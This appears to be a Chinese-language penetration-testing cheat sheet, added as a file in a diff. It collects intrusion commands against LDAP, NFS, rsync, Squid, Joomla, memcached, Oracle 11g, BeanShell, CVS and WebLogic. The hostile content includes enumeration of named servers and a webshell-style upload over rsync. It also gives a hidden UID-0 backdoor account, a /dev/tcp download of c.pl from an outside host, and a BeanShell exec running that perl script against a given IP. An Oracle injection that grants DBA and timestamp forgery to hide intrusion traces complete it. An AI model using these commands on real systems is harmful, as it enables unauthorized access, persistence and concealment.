@@ -1,0 +1,593 @@
+一.ldap渗透技巧
+1.cat /etc/nsswitch
+看看密码登录策略我们可以看到使用了file ldap模式
+
+2.less /etc/ldap.conf
+base ou=People,dc=unix-center,dc=net
+找到ou,dc,dc设置
+
+3.查找管理员信息
+匿名方式
+ldapsearch -x -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+有密码形式
+ldapsearch -x -W -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+
+
+4.查找10条用户记录
+ldapsearch -h 192.168.2.2 -x -z 10 -p 指定端口
+
+实战:
+1.cat /etc/nsswitch
+看看密码登录策略我们可以看到使用了file ldap模式
+
+2.less /etc/ldap.conf
+base ou=People,dc=unix-center,dc=net
+找到ou,dc,dc设置
+
+3.查找管理员信息
+匿名方式
+ldapsearch -x -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+有密码形式
+ldapsearch -x -W -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+
+
+4.查找10条用户记录
+ldapsearch -h 192.168.2.2 -x -z 10 -p 指定端口
+
+渗透实战:
+1.返回所有的属性
+ldapsearch -h 192.168.7.33 -b "dc=ruc,dc=edu,dc=cn" -s sub "objectclass=*"
+version: 1
+dn: dc=ruc,dc=edu,dc=cn
+dc: ruc
+objectClass: domain
+
+dn: uid=manager,dc=ruc,dc=edu,dc=cn
+uid: manager
+objectClass: inetOrgPerson
+objectClass: organizationalPerson
+objectClass: person
+objectClass: top
+sn: manager
+cn: manager
+
+dn: uid=superadmin,dc=ruc,dc=edu,dc=cn
+uid: superadmin
+objectClass: inetOrgPerson
+objectClass: organizationalPerson
+objectClass: person
+objectClass: top
+sn: superadmin
+cn: superadmin
+
+dn: uid=admin,dc=ruc,dc=edu,dc=cn
+uid: admin
+objectClass: inetOrgPerson
+objectClass: organizationalPerson
+objectClass: person
+objectClass: top
+sn: admin
+cn: admin
+
+dn: uid=dcp_anonymous,dc=ruc,dc=edu,dc=cn
+uid: dcp_anonymous
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+sn: dcp_anonymous
+cn: dcp_anonymous
+
+2.查看基类
+bash-3.00# ldapsearch -h 192.168.7.33 -b "dc=ruc,dc=edu,dc=cn" -s base "objectclass=*" | more
+version: 1
+dn: dc=ruc,dc=edu,dc=cn
+dc: ruc
+objectClass: domain
+
+3.查找
+bash-3.00# ldapsearch -h 192.168.7.33 -b "" -s base "objectclass=*"
+version: 1
+dn:
+objectClass: top
+namingContexts: dc=ruc,dc=edu,dc=cn
+supportedExtension: 2.16.840.1.113730.3.5.7
+supportedExtension: 2.16.840.1.113730.3.5.8
+supportedExtension: 1.3.6.1.4.1.4203.1.11.1
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.25
+supportedExtension: 2.16.840.1.113730.3.5.3
+supportedExtension: 2.16.840.1.113730.3.5.5
+supportedExtension: 2.16.840.1.113730.3.5.6
+supportedExtension: 2.16.840.1.113730.3.5.4
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.1
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.2
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.3
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.4
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.5
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.6
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.7
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.8
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.9
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.23
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.11
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.12
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.13
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.14
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.15
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.16
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.17
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.18
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.19
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.21
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.22
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.24
+supportedExtension: 1.3.6.1.4.1.1466.20037
+supportedExtension: 1.3.6.1.4.1.4203.1.11.3
+supportedControl: 2.16.840.1.113730.3.4.2
+supportedControl: 2.16.840.1.113730.3.4.3
+supportedControl: 2.16.840.1.113730.3.4.4
+supportedControl: 2.16.840.1.113730.3.4.5
+supportedControl: 1.2.840.113556.1.4.473
+supportedControl: 2.16.840.1.113730.3.4.9
+supportedControl: 2.16.840.1.113730.3.4.16
+supportedControl: 2.16.840.1.113730.3.4.15
+supportedControl: 2.16.840.1.113730.3.4.17
+supportedControl: 2.16.840.1.113730.3.4.19
+supportedControl: 1.3.6.1.4.1.42.2.27.9.5.2
+supportedControl: 1.3.6.1.4.1.42.2.27.9.5.6
+supportedControl: 1.3.6.1.4.1.42.2.27.9.5.8
+supportedControl: 1.3.6.1.4.1.42.2.27.8.5.1
+supportedControl: 1.3.6.1.4.1.42.2.27.8.5.1
+supportedControl: 2.16.840.1.113730.3.4.14
+supportedControl: 1.3.6.1.4.1.1466.29539.12
+supportedControl: 2.16.840.1.113730.3.4.12
+supportedControl: 2.16.840.1.113730.3.4.18
+supportedControl: 2.16.840.1.113730.3.4.13
+supportedSASLMechanisms: EXTERNAL
+supportedSASLMechanisms: DIGEST-MD5
+supportedLDAPVersion: 2
+supportedLDAPVersion: 3
+vendorName: Sun Microsystems, Inc.
+vendorVersion: Sun-Java(tm)-System-Directory/6.2
+dataversion: 020090516011411
+netscapemdsuffix: cn=ldap://dc=webA:389
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_DHE_RSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_DHE_DSS_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_RSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_DHE_DSS_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_DHE_RSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_DHE_DSS_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: SSL_RSA_WITH_RC4_128_MD5
+supportedSSLCiphers: SSL_RSA_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_RSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: SSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: SSL_RSA_FIPS_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: SSL_RSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: SSL_DHE_RSA_WITH_DES_CBC_SHA
+supportedSSLCiphers: SSL_DHE_DSS_WITH_DES_CBC_SHA
+supportedSSLCiphers: SSL_RSA_FIPS_WITH_DES_CBC_SHA
+supportedSSLCiphers: SSL_RSA_WITH_DES_CBC_SHA
+supportedSSLCiphers: TLS_RSA_EXPORT1024_WITH_RC4_56_SHA
+supportedSSLCiphers: TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA
+supportedSSLCiphers: SSL_RSA_EXPORT_WITH_RC4_40_MD5
+supportedSSLCiphers: SSL_RSA_EXPORT_WITH_RC2_CBC_40_MD5
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_NULL_SHA
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_NULL_SHA
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_NULL_SHA
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_NULL_SHA
+supportedSSLCiphers: SSL_RSA_WITH_NULL_SHA
+supportedSSLCiphers: SSL_RSA_WITH_NULL_MD5
+supportedSSLCiphers: SSL_CK_RC4_128_WITH_MD5
+supportedSSLCiphers: SSL_CK_RC2_128_CBC_WITH_MD5
+supportedSSLCiphers: SSL_CK_DES_192_EDE3_CBC_WITH_MD5
+supportedSSLCiphers: SSL_CK_DES_64_CBC_WITH_MD5
+supportedSSLCiphers: SSL_CK_RC4_128_EXPORT40_WITH_MD5
+supportedSSLCiphers: SSL_CK_RC2_128_CBC_EXPORT40_WITH_MD5
+
+渗透使用的脚本见附件
+
+二. NFS渗透技巧
+showmount -e ip
+列举IP
+
+渗透动画:
+
+三.rsync渗透技巧
+1.查看rsync服务器上的列表
+rsync 210.51.X.X::
+finance
+img_finance
+auto
+img_auto
+html_cms
+img_cms
+ent_cms
+ent_img
+ceshi
+res_img
+res_img_c2
+chip
+chip_c2
+ent_icms
+games
+gamesimg
+media
+mediaimg
+fashion
+res-fashion
+res-fo
+taobao-home
+res-taobao-home
+house
+res-house
+res-home
+res-edu
+res-ent
+res-labs
+res-news
+res-phtv
+res-media
+home
+edu
+news
+res-book
+
+看相应的下级目录(注意一定要在目录后面添加上/)
+
+
+rsync 210.51.X.X::htdocs_app/
+rsync 210.51.X.X::auto/
+rsync 210.51.X.X::edu/
+
+2.下载rsync服务器上的配置文件
+rsync -avz 210.51.X.X::htdocs_app/ /tmp/app/
+
+3.向上更新rsync文件(成功上传,不会覆盖)
+rsync -avz nothack.php 210.51.X.X::htdocs_app/warn/
+http://app.finance.xxx.com/warn/nothack.txt
+成功上传
+楼上就是实战的技巧
+
+四.squid渗透技巧
+nc -vv baidu.com 80
+GET HTTP://www.sina.com / HTTP/1.0
+GET HTTP://WWW.sina.com:22 / HTTP/1.0
+动画地址和密码:
+http://www.neeao.com/share/cnbir ... %BC%8F%E6%B4%9E.rar
+
+五.SSH端口转发
+ssh -C -f -N -g -R 44:127.0.0.1:22 cnbird@ip
+
+六.joomla渗透小技巧
+确定版本
+index.php?option=com_content&view=article&id=30:what-languages-are-supported-by-joomla-15&catid=32:languages&Itemid=47
+
+重新设置密码
+index.php?option=com_user&view=reset&layout=confirm
+
+七: Linux添加UID为0的root用户
+useradd -o -u 0 nothack
+
+八.freebsd本地提权
+[argp@julius ~]$ uname -rsi
+* freebsd 7.3-RELEASE GENERIC
+* [argp@julius ~]$ sysctl vfs.usermount
+* vfs.usermount: 1
+* [argp@julius ~]$ id
+* uid=1001(argp) gid=1001(argp) groups=1001(argp)
+* [argp@julius ~]$ gcc -Wall nfs_mount_ex.c -o nfs_mount_ex
+* [argp@julius ~]$ ./nfs_mount_ex
+*
+calling nmount()
+* [!] nmount error: -1030740736
+* nmount: Unknown error: -1030740736
+* [argp@julius ~]$ id
+* uid=0(root) gid=0(wheel) egid=1001(argp) groups=1001(argp)
+
+九.ldap技巧更新(xi4oyu提供)
+ldapsearch -x -s base -b "" "objectClass=*" +
+能够获得LDAP SERVER version naming context 加密选项，认证方式等详细的信息。
+
+ldapsearch -x -b '' -s base '(objectclass=*)' namingContexts
+
+获取namingContexts
+
+具体的 oid信息可以在：http://www.alvestrand.no/objectid/top.html查到
+
+列树
+
+ldapsearch -x -H ldap://xxxxx/
+
+猜测，看是否可写
+
+ldapadd .....
+
+找slapd.conf
+
+openldap/ldap.conf
+
+local:
+
+slapcat
+
+十.memcached渗透技巧
+memcached telnet操作
+
+telnet localhost 11211
+//保存
+set good 32 0 10
+helloworld
+STORED
+
+//取回
+gets good
+VALUE good 32 10 10
+helloworld
+END
+
+//替换
+replace good 32 0 10
+worldhello
+STORED
+get good
+VALUE good 32 10
+worldhello
+END
+
+//尾部添加
+append good 32 0 5
+after
+STORED
+get good
+VALUE good 32 15
+worldhelloafter
+END
+
+//头部添加
+prepend good 32 0 6
+before
+STORED
+get good
+VALUE good 32 21
+beforeworldhelloafter
+END
+
+//删除
+delete good
+DELETED
+get good
+END
+
+
+delete good
+NOT_FOUND
+
+
+cas good 32 0 10 hel
+helloworld
+EXISTS
+
+gets good
+VALUE good 32 10 10
+helloworld
+END
+
+
+cas bad 32 0 10 good
+worldhello
+NOT_FOUND
+
+
+//统计
+stats items
+STAT items:1:number 1
+STAT items:1:age 24
+STAT items:1:evicted 0
+STAT items:1:outofmemory 0
+END
+
+
+stats sizes
+96 1
+END
+
+stats slabs
+STAT 1:chunk_size 88
+STAT 1:chunks_per_page 11915
+STAT 1:total_pages 1
+STAT 1:total_chunks 11915
+STAT 1:used_chunks 11914
+STAT 1:free_chunks 1
+STAT 1:free_chunks_end 11913
+STAT 2:chunk_size 112
+STAT 2:chunks_per_page 9362
+STAT 2:total_pages 1
+STAT 2:total_chunks 9362
+STAT 2:used_chunks 9361
+STAT 2:free_chunks 1
+STAT 2:free_chunks_end 9361
+STAT 5:chunk_size 232
+STAT 5:chunks_per_page 4519
+STAT 5:total_pages 1
+STAT 5:total_chunks 4519
+STAT 5:used_chunks 4518
+STAT 5:free_chunks 1
+STAT 5:free_chunks_end 4518
+STAT active_slabs 3
+STAT total_malloced 3145472
+END
+
+
+stats items
+STAT items:1:number 1
+STAT items:1:age 1768
+STAT items:1:evicted 0
+STAT items:1:outofmemory 0
+END
+
+stats
+STAT pid 18261
+STAT uptime 528593
+STAT time 1237277383
+STAT version 1.2.6
+STAT pointer_size 32
+STAT rusage_user 0.004999
+STAT rusage_system 0.015997
+STAT curr_items 1
+STAT total_items 2
+STAT bytes 66
+STAT curr_connections 2
+STAT total_connections 13
+STAT connection_structures 3
+STAT cmd_get 11
+STAT cmd_set 8
+STAT get_hits 2
+STAT get_misses 9
+STAT evictions 0
+STAT bytes_read 1342
+STAT bytes_written 8752
+STAT limit_maxbytes 134217728
+STAT threads 1
+END
+
+
+使用usr/bin/perl /root/memcached-1.2.6/scripts/memcached-tool localhost:11211
+output
+# Item_Size   Max_age 1MB_pages Count   Full?
+1      88 B     1531 s       1       1      no
+2     112 B        0 s       1       0      no
+5     232 B        0 s       1       0      no
+
+# slab class编号 
+Item_Size Chunk大小 
+Max_age LRU内最旧的记录的生存时间 
+1MB_pages 分配给Slab的页数 
+Count Slab内的记录数 
+Full? Slab内是否含有空闲chunk
+
+十一.无wget下载文件
+假设要下载http://yese.yi.org/c.pl
+
+exec 5<>/dev/tcp/yese.yi.org/80 &&echo -e "GET /c.pl HTTP/1.0\n" >&5 && cat<&5 > c.pl
+
+当然http头你要自己去掉
+
+当然，你用nc -l -p 80 <c.pl 就不用这么麻烦了
+
+十二.ORACLE 11G提权
+DBMS_JVM_EXP_PERMS 中的IMPORT_JVM_PERMS
+
+判断登陆权限
+select * from session_privs;
+CREATE SESSION
+
+select * from session_roles;
+
+select TYPE_NAME, NAME, ACTION FROM SYS.DBA_JAVA_POLICY WHERE GRANTEE = 'GREMLIN(用户名)';
+
+DESC JAVA$POLICY$
+
+DECLARE
+POL DBMS_JVM_EXP.TEMP_JAVA_POLICY;
+CURSOR C1 IS SELECT 'GRANT' USER(), 'SYS', 'java.io.FilePermission', '<<ALL FILES>>', 'execute', 'ENABLE' FROM DUAL;
+BEGIN
+OPEN C1;
+FETCH C1 BULK COLLECT INTO POL;
+CLOSE C1;
+DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
+END;
+/
+
+connect / as sysdba
+COL TYPE_NAME FOR A30;
+COL NAME FOR A30;
+COL_ACTION FOR A10;
+SELECT TYPE_NAME, NAME, ACTION FROM SYS.DBA_JAVA_POLICY WHERE GRANTEE = '用户';
+
+connect 普通用户
+set serveroutput on
+exec dbms_java.set_output(10000);
+
+SELECT DBMS_JAVA.SET_OUTPUT_TO_JAVA('ID', 'oracle/aurora/rdbms/DbmsJava', 'SYS', 'writeOutputToFile', 'TEXT', NULL, NULL, NULL, NULL,0,1,1,1,1,0, 'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;'BEGIN EXECUTE IMMEDIATE ''GRANT DBA TO 用户''; END;', 'BEGIN NULL; END;') FROM DUAL;
+
+EXEC DBMS_CDC_ISUBSCRIBE.INT_PURGE_WINDOWS('NO_SUCH_SUBSCRIPTION', SYSDATE());
+
+set role dba;
+
+select * from session_privs;
+
+EXEC SYS.VULNPROC('FOO"||DBMS_JAVA.SET_OUTPUT_TO_SQL("ID","DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE""GRANT DBA TO PUBLIC"";DBMS_OUTPUT.PUT_LINE(:1);END;","TEXT")||"BAR');
+
+SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Test') FROM DUAL;
+
+SET ROLE DBA;
+
+十三:beanshell渗透技巧
+exec("/usr/bin/perl /var/tmp/c.pl 218.56.57.151 53");
+实例:XXX易多台beanshell漏洞咋不发布,等漏洞修补发布
+
+十四.cvs渗透技巧
+CVSROOT/passwd UNIX SHA1的密码文件
+CVSROOT/readers
+CVSROOT/writers
+CVS/Root
+CVS/Entries 更新的文件和目录内容
+CVS/Repository
+
+十五.修改上传文件时间戳(掩盖入侵痕迹)
+touch -r 老文件时间戳 新文件时间戳
+
+十六.Weblogin Script Tool(WLST)
+
+写入到\\config\\config.xml
+
+1.进行修改:
+\wlserver_10.0\server\bin\setWLSenv.sh
+2.启动WLST
+java weblogic.WLST
+
+wls:/offline> connect(‘admin’, ‘admin’, ‘t3://127.0.0.1:7001′)
+wls:/bbk/serverConfig> help()
+
+wls:/bbk/serverConfig> edit()
+wls:/bbk/serverConfig> cd(‘Servers’)
+wls:/bbk/serverConfig/Server-cnbird> cd(‘Log’)
+wls:/bbk/serverConfig/Server-cnbird/log> cd(‘Server-cnbird’)
+wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird> startEdit()
+wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !> set(‘FileCount’, ‘4′)
+wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !> save()
+wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !> activate() 提交对应Active Change
+wls:/bbk/serverConfig/Server-cnbird/log/Server-cnbird !> disconnect()
+wls:/offline> exit()
+
+3.批处理:
+保存以上命令为cnbird.py
+connect(‘admin’, ‘admin’, ‘t3://127.0.0.1:7001′)
+cd(‘Servers’)
+cd(‘Log’)
+cd(‘Server-cnbird’)
+startEdit()
+set(‘FileCount’, ‘4′)
+save()
+然后执行java weblogic.WLST cnbird.py
+
+一句话修改linux密码(来自包总blog)
+echo “11111″|passwd –stdin user111
+echo "cnbird:cnbird"|chpasswd
